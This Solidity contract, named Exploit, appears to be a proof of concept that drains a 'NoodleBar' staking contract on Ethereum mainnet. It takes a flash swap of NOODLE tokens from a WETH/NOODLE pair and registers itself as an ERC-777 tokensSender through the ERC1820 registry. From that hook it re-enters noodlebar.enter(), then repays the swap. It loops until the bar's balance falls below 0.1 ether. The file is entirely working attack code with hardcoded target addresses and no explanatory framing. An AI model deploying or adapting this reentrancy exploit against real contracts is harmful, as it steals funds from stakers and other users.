// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.10;

import "oz/token/ERC20/IERC20.sol";

interface IFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface INoodleBar {
    function balanceOf(address account) external view returns (uint256);
    function enter(uint256 _amount) external;
    function leave(uint256 _share) external;
}

interface IERC1820Registry {
    function setInterfaceImplementer(
        address account,
        bytes32 _interfaceHash,
        address implementer
    ) external;   
}

contract Exploit {

    uint256 min = 0.1 ether;
    uint256 loops = 5;

    uint256 rate;
    uint256 entered;
    address public owner;
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 noodle = IERC20(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA);
    INoodleBar noodlebar = INoodleBar(0x3561081260186E69369E6C32F280836554292E08);

    IERC1820Registry registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IFactory factory = IFactory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);
    IPair pair;

    constructor() {
        owner = msg.sender;
        pair = IPair(factory.getPair(address(weth), address(noodle)));
        noodle.approve(address(noodlebar), type(uint256).max);
        registry.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    function run() external {
        uint256 r = min;

        while (r >= min) {
            entered = 0;
            uint256 b = noodle.balanceOf(address(pair));
            pair.swap({
                amount0Out: b-1,
                amount1Out: 0,
                to: address(this),
                data: hex"00"
            });
            r = noodle.balanceOf(address(noodlebar));
        }
    }

    function uniswapV2Call(address sender, uint amount0, uint , bytes calldata) external {
        require(tx.origin == owner && sender == address(this) && msg.sender == address(pair), "owner");
        rate = amount0 / loops;
        noodlebar.enter(rate);

        noodlebar.leave(noodlebar.balanceOf(address(this)));
        uint256 fee = ((amount0 * 3) / 997) + 1;
        noodle.transfer(address(pair), amount0 + fee);
    }

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        entered++;
        if (entered < loops) {
            noodlebar.enter(rate);
        }
    }

    function canImplementInterfaceForAddress(bytes32, address) external pure returns(bytes32) {
        return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));
    }
}